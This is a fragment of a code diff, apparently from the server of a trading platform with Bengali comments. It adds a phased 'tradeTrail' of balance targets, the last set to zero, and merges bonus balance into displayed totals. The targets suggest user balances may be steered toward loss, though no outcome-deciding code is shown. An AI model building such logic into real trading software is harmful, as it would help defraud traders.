+                                    }
+                                } else if (trail.phase === 4) {
+                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
+                                        trail.phase = 4; trail.baseBalance = newTotalBal; needsTrailUpdate = true;
+                                    }
+                                }
+                            } else {
+                                if (trail.phase === 1) {
+                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
+                                        trail.phase = 2; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 1.50; needsTrailUpdate = true;
+                                    }
+                                } else if (trail.phase === 2) {
+                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
+                                        trail.phase = 3; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 0.30; needsTrailUpdate = true;
+                                    }
+                                } else if (trail.phase === 3) {
+                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
+                                        trail.phase = 4; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 1.15; needsTrailUpdate = true;
+                                    }
+                                } else if (trail.phase === 4) {
+                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
+                                        trail.phase = 5; trail.baseBalance = newTotalBal; trail.targetBalance = 0; needsTrailUpdate = true;
+                                    }
+                                }
+                            }
+                            if (needsTrailUpdate) {
+                                updates[`users/${uid}/tradeTrail`] = trail;
+                                user.tradeTrail = trail;
+                            }
+                        }
+
                         // রেফারেল বোনাস টাস্ক ট্র্যাকিং ($৫ বোনাস)
                         const taskSnap = await db.ref(`users/${uid}/referralBonusTask`).once('value');
                         const task = taskSnap.val();
                         if (task && task.status === 'active') {
                             const newTrades = (task.currentTrades || 0) + 1;
-                            const finalBalance = (parseFloat(user.realBalance || 0)) + (result === 'win' ? profitChange + (trade.realAmount || 0) : (result === 'push' ? (trade.realAmount || 0) : 0));
+                            const finalBalance = newTotalBal;
                             
                             if (newTrades >= 10 && finalBalance >= 0.5) {
                                 updates[`users/${uid}/referralBonusTask/status`] = 'completed';
@@ -1207,12 +1549,12 @@ setInterval(async () => {
                     // টেলিগ্রামে ট্রেড রেজাল্ট মেসেজ পাঠানো
                     if (trade.tgMessageId) {
                         const icon = result === 'win' ? '✅' : (result === 'loss' ? '❌' : '🔄');
-                        const curRealBal = (parseFloat(user.realBalance || 0)) + (result === 'win' ? profitChange : 0);
+                        const curTotalBal = updatedRealBal + updatedBonusBal;
                         
                         sendTgMessage(
                             `${icon} <b>Trade Closed: ${result.toUpperCase()}</b>\n` +
                             `💵 <b>Payout:</b> $${payout.toFixed(2)}\n` +
-                            `💰 <b>Current Balance:</b> $${curRealBal.toFixed(2)}`,
+                            `💰 <b>Current Total Balance:</b> $${curTotalBal.toFixed(2)} (Real: $${updatedRealBal.toFixed(2)} | Bonus: $${updatedBonusBal.toFixed(2)})`,
                             trade.tgMessageId
                         ).catch(() => {});
                     }
@@ -1515,7 +1857,7 @@ function pollTelegramUpdates() {
                                 // 4. Compute Comprehensive Referral Statistics
                                 const targetName = target.name || target.displayName || 'Trader';
                                 const targetCountry = target.country || 'N/A';
-                                const targetBalance = parseFloat(target.realBalance || 0).toFixed(2);
+                                const targetBalance = ((parseFloat(target.realBalance || 0)) + (parseFloat(target.bonusBalance || 0))).toFixed(2);
                                 const targetPnl = parseFloat(target.totalProfitLoss || 0).toFixed(2);
                                 
                                 const totalDeposit = parseFloat(target.taskProgress?.totalDepositAmount || 0);
